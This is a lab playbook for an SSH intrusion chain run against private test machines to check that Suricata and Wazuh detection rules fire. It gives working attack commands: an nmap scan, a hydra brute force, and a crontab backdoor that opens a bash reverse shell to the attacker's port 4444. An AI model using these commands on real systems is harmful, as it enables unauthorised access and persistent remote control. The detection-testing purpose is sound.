# Playbook — Attack Chain 1: SSH Intrusion & Persistence

Quick reference for reproducing the attack chain in the lab. Run commands in order.

---

## Prerequisites

- Victim (10.10.1.133): SSH enabled, Wazuh Agent running
- Sensor (10.10.1.132): Suricata + Zeek + Wazuh Agent running
- Wazuh Server (10.10.1.131): Wazuh Manager running
- Attacker: Kali Linux (10.10.1.130)

Verify services before starting:

```bash
# On Sensor
sudo systemctl status suricata
sudo /opt/zeek/bin/zeekctl status
sudo systemctl status wazuh-agent

# On Victim
sudo systemctl status ssh
sudo systemctl status wazuh-agent

# On Wazuh Server
sudo systemctl status wazuh-manager
```

---

## Step 1 — Port Scan

**Machine:** Kali (10.10.1.130)

```bash
sudo nmap -sS -p- 10.10.1.133
```

**Expected result:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Expected alert:** Suricata rule 100001 — `SCAN Nmap SYN Scan Detected`

---

## Step 2 — SSH Brute Force

**Machine:** Kali (10.10.1.130)

```bash
hydra -l nvphuong -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.10.1.133 -t 4 -V
```

**Expected result:**
```
[22][ssh] host: 10.10.1.133   login: nvphuong   password: 456789
```

**Expected alert:** Suricata rule 100002 — `BRUTE SSH Brute Force Attempt`

---

## Step 3 — Successful Login

**Machine:** Kali (10.10.1.130)

```bash
ssh nvphuong@10.10.1.133
# Enter password: 456789
```

**Expected alert:** Wazuh rule 100008 — `MITRE T1078 - Valid Accounts: Successful SSH login`

---

## Step 4 — Crontab Backdoor

**Machine:** Victim (via SSH session from Step 3)

```bash
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/10.10.1.130/4444 0>&1") | crontab -
```

Verify:
```bash
crontab -l
```

**Expected output:**
```
* * * * * /bin/bash -i >& /dev/tcp/10.10.1.130/4444 0>&1
```

**Expected alert:** Wazuh FIM rule 100003 — `MITRE T1053.003 - Scheduled Task: Crontab modification`

---

## Verify All Alerts

**On Sensor — check Suricata:**
```bash
sudo tail -20 /var/log/suricata/fast.log | grep -E "1000001|1000002"
```

**On Wazuh Server — check alerts:**
```bash
sudo grep -E "100001|100002|100003|100008" /var/ossec/logs/alerts/alerts.log | tail -20
```

**Check Slack:** Open `#all-wazuh-alerts` channel — should see 4 alerts with MITRE IDs.

---

## Cleanup

Run after each lab session to reset the environment:

```bash
# On Victim — remove crontab backdoor
crontab -r

# On Victim — verify cleanup
crontab -l
# should return: no crontab for nvphuong
```
